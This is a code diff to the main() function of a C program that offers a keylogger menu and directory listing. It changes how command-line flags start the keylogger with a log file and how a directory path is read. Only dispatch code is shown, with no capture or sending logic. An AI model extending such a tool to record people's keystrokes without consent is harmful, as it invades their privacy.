@@ -22,21 +22,20 @@ void list_files_in_directory(const char *path);
 
 int main(int argc, char *argv[]) 
 {
-    // Check if -m 3 is passed with a log file (keylog.txt)
-    if (argc == 4 && strcmp(argv[1], "-m") == 0 && atoi(argv[2]) == 3) {
-        const char *logfile = argv[3];  // Use the provided logfile
-        keylogger_operations_menu(logfile);  // Call the keylogger operation directly
-        return 0;  // Exit immediately after starting the keylogger
-    }
 
-     // Check if -m 2 3 is passed to list directory contents
-     if (argc == 4 && strcmp(argv[1], "-m") == 0 && atoi(argv[2]) == 2 && atoi(argv[3]) == 3) {
-     const char *dir_path = argv[3];
+     
+     if (argc == 4 && strcmp(argv[1], "-m") == 0 && atoi(argv[2]) == 3) {
+        const char *logfile = argv[3];
+        keylogger_operations_menu(logfile);
+        return 0;
+      }
 
-     list_files_in_directory(dir_path);
-     return 0;
+      if (argc == 5 && strcmp(argv[1], "-m") == 0 && atoi(argv[2]) == 2 && atoi(argv[3]) ==3) {
+        const char *path = argv[4]; 
+        list_files_in_directory(path);
+        return 0;
+       }
 
-    }
 
     // Main menu if no command-line args are passed
     int choice;
@@ -73,6 +72,7 @@ int main(int argc, char *argv[])
         }
     }
 }
+  
 
 // Keylogger menu function
 void keylogger_operations_menu(const char *logfile) 
@@ -189,6 +189,7 @@ void directory_operations_menu()
             default:
                 printf("Invalid choice! Please try again.\n");
         }
+
     }
 }
 
